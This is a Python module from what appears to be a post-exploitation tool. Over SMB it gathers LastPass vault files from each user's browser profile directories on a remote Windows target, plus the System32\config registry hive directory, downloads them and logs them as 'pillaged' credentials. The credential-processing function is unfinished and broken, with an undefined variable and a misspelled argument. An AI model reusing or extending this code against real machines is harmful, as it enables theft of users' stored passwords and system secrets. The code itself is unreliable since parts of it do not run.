#%UserProfile%\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0
r'''
https://www.slideshare.net/martinvigo/breaking-vaults-stealing-lastpass-protected-secrets

Windows data storage
Chrome – Run %AppData% then go to AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\
Firefox and Internet Explorer – Run %AppData% then go to AppData\LocalLow\LastPass\ OR Run %AppData% then go to AppData\Local Settings\Application Data\LastPass\
Edge – Run %AppData% then go to AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\
Opera – Run %AppData% then go to AppData\Local\Opera Software\Opera Stable\Cache\
'''
import ntpath
import LnkParse3
from lib.toolbox import bcolors
from lib.fileops import MyFileOps

class lastpass():
    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb


    def run(self):
        self.get_files()
        #self.process_files()
        #self.decrypt_all()

    def get_files(self):
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering New Module Secrets {bcolors.ENDC}")
        blacklist = ['.', '..']

        user_directories = [("Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\\", ('*')),
                            ("Users\\{username}\\AppData\\LocalLow\\LastPass\\",('*')),
                            ("Users\\{username}\\AppData\\Local Settings\\Application Data\\LastPass\\", ('*')),
                            ("Users\\{username}\\AppData\\Opera Software\\Opera Stable\\Cache\\", ('*')),
                            ("Users\\{username}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\", ('*.xls','*.pdf','*.doc*','*.lnk'))]
        machine_directories = [("Windows\\System32\\config\\", '*'),]

        for user in self.users:
            self.logging.debug(
                f"[{self.options.target_ip}] Looking for {user.username} ")
            if user.username == 'MACHINE$':
                directories_to_use = machine_directories
            else:
                directories_to_use = user_directories

            for info in directories_to_use:
                my_dir, my_mask = info
                tmp_pwd = my_dir.format(username=user.username)
                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
                for mask in my_mask:
                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
                    for infos in my_directory:
                        longname, is_directory = infos
                        self.logging.debug("ls returned file %s" % longname)
                        if longname not in blacklist and not is_directory:
                            try:
                                # Downloading file
                                localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
                                self.process_file(localfile,user)
                            except Exception as ex:
                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
                                self.logging.debug(ex)



    def process_file(self,localfile,username):
        try:
            #encryptionkey = PBKDF2-SHA256(username,Masterpassword,iteration,32)
            '''
            #Rememberme
            sqliteDB or pref.js (user_pref("extensions.lastpass.loginusers/loginpws)
            ECB or CBC
            AES-256(IV,Key=sha256(username),data) =>Data=!IV24
            '''

            self.db.add_credz(credz_type='LASTPASS',credz_username=username.decode('utf-8'),redz_password=ntlm.decode('utf-8'),credz_target='',credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
            return 1
        except Exception as ex:
            self.logging.debug(
                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ProcessFile {localfile}{bcolors.ENDC}")
            self.logging.debug(ex)

